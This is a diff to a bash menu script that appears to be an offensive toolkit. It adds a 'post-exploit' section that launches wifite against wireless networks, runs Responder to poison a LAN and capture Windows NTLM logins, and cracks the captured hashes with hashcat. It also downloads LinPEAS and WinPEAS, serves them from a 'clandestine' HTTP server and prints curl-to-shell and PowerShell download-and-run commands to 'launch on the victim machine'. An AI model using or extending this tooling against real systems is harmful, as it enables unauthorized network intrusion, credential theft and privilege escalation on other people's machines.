@@ -195,7 +195,7 @@ run_requisitos() {
     clear
     echo -e "${DARK_GRAY}[*] Updating system and installing base dependencies...${NC}"
     sudo apt update && sudo apt upgrade -y
-    sudo apt install -y git python3 python3-pip python3-venv pipx metasploit-framework curl php tor ruby nmap amass nuclei hydra ffuf wpscan jq macchanger
+    sudo apt install -y git python3 python3-pip python3-venv pipx metasploit-framework curl php tor ruby nmap amass nuclei hydra ffuf wpscan jq macchanger wifite aircrack-ng responder hashcat
     echo -e "${DARK_GRAY}[+] Core requirements installed.${NC}"
     pause_menu
 }
@@ -411,6 +411,71 @@ run_metasploit() {
     else
         echo -e "${RED}[!] Metasploit not found. Install requirements.${NC}"
     fi
+    pause_menu
+}
+
+# ==========================================
+# PHYSICAL & ELITE POST-EXPLOIT (V9)
+# ==========================================
+run_wifite() {
+    clear
+    echo -e "${RED}[!] WARNING: Wifite will put your interface in Monitor Mode!${NC}"
+    echo -e "${DARK_GRAY}[*] Internet connection will be dropped during the attack.${NC}"
+    sleep 2
+    if command -v wifite >/dev/null; then 
+        sudo wifite --kil
+    else 
+        echo -e "${RED}[!] Wifite not found. Run Install Requirements.${NC}"
+    fi
+    pause_menu
+}
+
+run_responder() {
+    clear
+    read -p "Local Interface to Poison (e.g., eth0, wlan0): " iface_rsp
+    if ! sanitize_input "$iface_rsp"; then echo -e "${RED}[!] Invalid input.${NC}"; pause_menu; return; fi
+    
+    if command -v responder >/dev/null; then
+        echo -e "${DARK_GRAY}[*] Flooding LAN & Listening for NTLM Authentication from Windows...${NC}"
+        sudo responder -I "$iface_rsp" -dwv
+    else
+        echo -e "${RED}[!] Responder not found. Run Install Requirements.${NC}"
+    fi
+    pause_menu
+}
+
+run_hashcat() {
+    prepare_tools_dir || return
+    read -p "Path to the extracted Hash file: " hash_fl
+    read -p "Hashcat Mode Type (e.g., 1000 for NTLM, 0 for MD5): " h_mode
+    read -p "Wordlist path (e.g., /usr/share/wordlists/rockyou.txt): " h_wlist
+    
+    if command -v hashcat >/dev/null; then
+        echo -e "${DARK_GRAY}[*] Initializing GPU Crackers offline...${NC}"
+        hashcat -m "$h_mode" "$hash_fl" "$h_wlist" --force -O | log_output "Hashcat"
+    else
+        echo -e "${RED}[!] Hashcat not found.${NC}"
+    fi
+    pause_menu
+}
+
+run_peas_server() {
+    prepare_tools_dir || return
+    echo -e "${DARK_GRAY}[*] Downloading Privilege Escalation Suites (LinPEAS/WinPEAS)...${NC}"
+    
+    mkdir -p Peas_Payloads
+    cd Peas_Payloads
+    if [ ! -f "linpeas.sh" ]; then curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh; fi
+    if [ ! -f "winPEASx64.exe" ]; then curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o winPEASx64.exe; fi
+    
+    MY_LIP=$(ip route get 8.8.8.8 2>/dev/null | awk '{print $7}')
+    echo -e "${RED}\n[!] LAUNCH THIS ON THE VICTIM MACHINE TO ESCALATE PRIVILEGES:${NC}"
+    echo -e "${DARK_GRAY}Linux: curl http://$MY_LIP:8080/linpeas.sh | sh${NC}"
+    echo -e "${DARK_GRAY}Windows (PS): Invoke-WebRequest -Uri http://$MY_LIP:8080/winPEASx64.exe -OutFile .\winPEAS.exe; .\winPEAS.exe${NC}\n"
+    
+    echo -e "${DARK_GRAY}[*] Starting Clandestine HTTP Server on port 8080... (Ctrl+C to close)${NC}"
+    python3 -m http.server 8080
+    cd ..
     pause_menu
 }
 
